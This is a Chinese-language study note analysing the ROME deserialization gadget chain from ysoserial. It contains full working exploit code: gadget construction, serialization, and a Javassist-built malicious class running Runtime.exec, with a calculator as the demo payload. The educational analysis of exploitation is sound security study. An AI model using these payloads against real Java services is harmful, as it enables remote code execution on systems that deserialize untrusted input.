# ysoserial中的链条
```java
* TemplatesImpl.getOutputProperties()  
* NativeMethodAccessorImpl.invoke0(Method, Object, Object[])  
* NativeMethodAccessorImpl.invoke(Object, Object[])  
* DelegatingMethodAccessorImpl.invoke(Object, Object[])  
* Method.invoke(Object, Object...)  
* ToStringBean.toString(String)  
* ToStringBean.toString()  
* ObjectBean.toString()  
* EqualsBean.beanHashCode()  
* ObjectBean.hashCode()  
* HashMap<K,V>.hash(Object)  
* HashMap<K,V>.readObject(ObjectInputStream)  
```
## 链条分析
### TemplatesImpl.getOutputProperties()
`TemplatesImpl.getOutputProperties()`的调用就是[动态加载字节码](动态加载字节码.md)的方法
这里的`getOutputProperties`是一个调用了`newTransformer`的public类

### ToStringBean.toString()
```java
public ToStringBean(Class beanClass, Object obj) {  
    this._beanClass = beanClass;  
    this._obj = obj;  
}
```
`ToStringBean`可用传入两个参数，而它的`toString`方法

```java
private String toString(String prefix) {  
    StringBuffer sb = new StringBuffer(128);  
    try {  
        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);  
        if (pds!=null) {  
            for (int i=0;i<pds.length;i++) {  
                String pName = pds[i].getName();  
                Method pReadMethod = pds[i].getReadMethod();  
                if (pReadMethod!=null &&                             // ensure it has a getter method  
                    pReadMethod.getDeclaringClass()!=Object.class && // filter Object.class getter methods  
                    pReadMethod.getParameterTypes().length==0) {     // filter getter methods that take parameters  
                    Object value = pReadMethod.invoke(_obj,NO_PARAMS);  
                    printProperty(sb,prefix+"."+pName,value);  
                }  
            }  
        }  
    }  
    catch (Exception ex) {  
        sb.append("\n\nEXCEPTION: Could not complete "+_obj.getClass()+".toString(): "+ex.getMessage()+"\n");  
    }  
    return sb.toString();  
}
```
从注释可用看的出来是会获取到，传入的类中的getter方法

这里的重点是getPDs的使用在getPDSs中又调用了getPDs，在这里做了方法重载
```java
public static synchronized PropertyDescriptor[] getPropertyDescriptors(Class klass) throws IntrospectionException {  
    PropertyDescriptor[] descriptors = (PropertyDescriptor[]) _introspected.get(klass);  
    if (descriptors==null) {  
        descriptors = getPDs(klass);  
        _introspected.put(klass,descriptors);  
    }  
    return descriptors;  
}

private static PropertyDescriptor[] getPDs(Class klass) throws IntrospectionException {  
    Method[] methods = klass.getMethods();  
    Map getters = getPDs(methods,false);  
    Map setters = getPDs(methods,true);  
    List pds     = merge(getters,setters);  
    PropertyDescriptor[] array = new PropertyDescriptor[pds.size()];  
    pds.toArray(array);  
    return array;  
}
```

符合get开头的匹配，所有可以用来触发`getOutputProperties()`
```java
private static final String SETTER = "set";  
private static final String GETTER = "get";  
private static final String BOOLEAN_GETTER = "is";  
  
private static Map getPDs(Method[] methods,boolean setters) throws IntrospectionException {  
    Map pds = new HashMap();  
    for (int i=0;i<methods.length;i++) {  
        String pName = null;  
        PropertyDescriptor pDescriptor = null;  
        if ((methods[i].getModifiers()&Modifier.PUBLIC)!=0) {  
            if (setters) {  
                if (methods[i].getName().startsWith(SETTER) &&  
                    methods[i].getReturnType()==void.class && methods[i].getParameterTypes().length==1) {  
                    pName = Introspector.decapitalize(methods[i].getName().substring(3));  
                    pDescriptor = new PropertyDescriptor(pName,null,methods[i]);  
                }  
            }  
            else {  
                if (methods[i].getName().startsWith(GETTER) &&  
                    methods[i].getReturnType()!=void.class && methods[i].getParameterTypes().length==0) {  
                    pName = Introspector.decapitalize(methods[i].getName().substring(3));  
                    pDescriptor = new PropertyDescriptor(pName,methods[i],null);  
                }  
                else  
                if (methods[i].getName().startsWith(BOOLEAN_GETTER) &&  
                    methods[i].getReturnType()==boolean.class && methods[i].getParameterTypes().length==0) {  
                    pName = Introspector.decapitalize(methods[i].getName().substring(2));  
                    pDescriptor = new PropertyDescriptor(pName,methods[i],null);  
                }  
            }  
        }  
        if (pName!=null) {  
            pds.put(pName,pDescriptor);  
        }  
    }  
    return pds;  
}
```

最后返回到toString，用invoke来触发方法
![](attachments/Pasted%20image%2020230301152902.png)

在这里进行调试的时候会发现，事实上在ysoserial中在`ToStringBean.toString()`和`TemplatesImpl.getOutputProperties()`的链条流程实质上已经包含在执行中了
![](attachments/Pasted%20image%2020230301153551.png)

### EqualsBean.beanHashCode()
类本身和前面的ToStringBean类似,都是传入class 和 object两个参数
```java
public EqualsBean(Class beanClass,Object obj) {  
    if (!beanClass.isInstance(obj)) {  
        throw new IllegalArgumentException(obj.getClass()+" is not instance of "+beanClass);  
    }  
    _beanClass = beanClass;  
    _obj = obj;  
}
```

直接看到beanHashCode()
```java
public int hashCode() {  
    return beanHashCode();  
}  
  
public int beanHashCode() {  
    return _obj.toString().hashCode();  
}
```

这里结合上面的toString()，其实很容易想到去调用`EqualsBean`的HashCode()然后调用beanHashCode()

### ObjectBean.hashCode()
```java
public ObjectBean(Class beanClass,Object obj) {  
    this(beanClass,obj,null);  
}
```
这里发现ObjectBean既可以调用`equalsBean.beanHashCode()`还可用调用`toStringBean.toString()`
![](attachments/Pasted%20image%2020230301160102.png)

也就是说可用跳过`equalsBean.beanHashCode()`直接去触发`toStringBean.toString()`

### HashMap<K,V>.hash(Object)
用HashMap去触发hashcode，这里就涉及到链子的两种选择，一个是去触发`equalsBean.HashCode`,另一个是去触发`ObjectBea.HashCode()`

exp
这个是使用equalsBean的，使用ObjectBean的话只要和equalsBean做替换就可以了，当然也可以两个同时用，已经写到注释里了
```java
package com.rome;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import com.sun.syndication.feed.impl.EqualsBean;  
import com.sun.syndication.feed.impl.ObjectBean;  
import com.sun.syndication.feed.impl.ToStringBean;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
  
public class ROME_toString {  
  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl templatesimpl = new TemplatesImpl();  
  
        byte[] bytecodes = Files.readAllBytes(Paths.get("E:\\JavaSec\\ROME\\target\\classes\\com\\rome\\shell.class"));  
  
  
        setValue(templatesimpl,"_name","aaa");  
        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});  
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());  
  
        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);  
        ////toStringBean.toString();  
        //只使用EqualsBean  
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);  
        ////equalsBean.hashCode();  
        //使用两个  
        ObjectBean objectBean = new ObjectBean(EqualsBean.class, equalsBean);  
        //只使用ObjectBean  
        //ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);        ////objectBean.hashCode();        HashMap<Object, Object> hashMap = new HashMap<>();  
        //hashMap.put(equalsBean, "1");  
        hashMap.put(objectBean, "1");  
  
        //serialize(hashMap);  
        unserialize("ser.bin");  
    }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
    }  
    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
  
    public static void setValue(Object obj, String name, Object value) throws Exception {  
        Field field = obj.getClass().getDeclaredField(name);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
}
```

## HashTable <=> HashMap
大同小异的替换
```java
Hashtable hashtable= new Hashtable();  
hashtable.put(equalsBean,"1");  
serialize(hashtable);
```

## BadAttributeValueExpException 利用链

在CC链中出现过，`BadAttributeValueExpException`可以调用任意的`toSrting()`方法
直接去与`toStringBean`衔接
```java
BadAttributeValueExpException badAttributeValueExpException =new BadAttributeValueExpException(toStringBean);
serialize(badAttributeValueExpException);
```

# 链条精简
这个y4已经写的很(狠)好了，就不多赘述
[ROME改造计划 | Y4tacker's Blog](https://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/)
贴一份y4的代码
Rome.java
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.syndication.feed.impl.EqualsBean;  
import javax.xml.transform.Templates;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectOutputStream;  
import java.util.Base64;  
import java.util.HashMap;  
  
import static sec.payload.Payload.setFieldValue;  
  
  
public class Rome {  
  
	public static void main(String[] args) throws Exception {  
		TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl();  
		EqualsBean bean = new EqualsBean(String.class,"");  
		HashMap map1 = new HashMap();  
		HashMap map2 = new HashMap();  
		map1.put("aa",templates);  
		map1.put("bB",bean);  
		map2.put("aa",bean);  
		map2.put("bB",templates);  
		HashMap map = new HashMap();  
		map.put(map1,"");  
		map.put(map2,"");  
  
		setFieldValue(bean,"_beanClass",Templates.class);  
		setFieldValue(bean,"_obj",templates);  
  
  
		ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
		ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
		objectOutputStream.writeObject(map);  
		System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())));  
  
		System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())).length());  
	}  
  
}
```
GetTemplatesImpl.java
```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import java.lang.reflect.Field;  
  
public class GetTemplatesImpl {  
    public static TemplatesImpl getTemplatesImpl() throws Exception{  
  
        byte[][] bytes = new byte[][]{GenerateEvilByJavaassist.generate()};  
  
  
  
        TemplatesImpl templates = TemplatesImpl.class.newInstance();  
        setValue(templates, "_bytecodes", bytes);  
        setValue(templates, "_name", "1");  
        setValue(templates, "_tfactory", null);  
  
  
        return  templates;  
    }  
  
    public static void setValue(Object obj, String name, Object value) throws Exception{  
        Field field = obj.getClass().getDeclaredField(name);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
}
```
GenerateEvilByJavaassist.java
```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
import javassist.ClassPool;  
import javassist.CtClass;  
import javassist.CtConstructor;  
  
public class GenerateEvilByJavaassist {  
    public static byte[] generate() throws Exception{  
        ClassPool pool = ClassPool.getDefault();  
        CtClass clazz = pool.makeClass("a");  
        CtClass superClass = pool.get(AbstractTranslet.class.getName());  
        clazz.setSuperclass(superClass);  
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);  
        constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");  
        clazz.addConstructor(constructor);  
        return clazz.toBytecode();  
    }  
  
  
}
```
# 小结
这个链子的精华就是调用任意的get开头的方法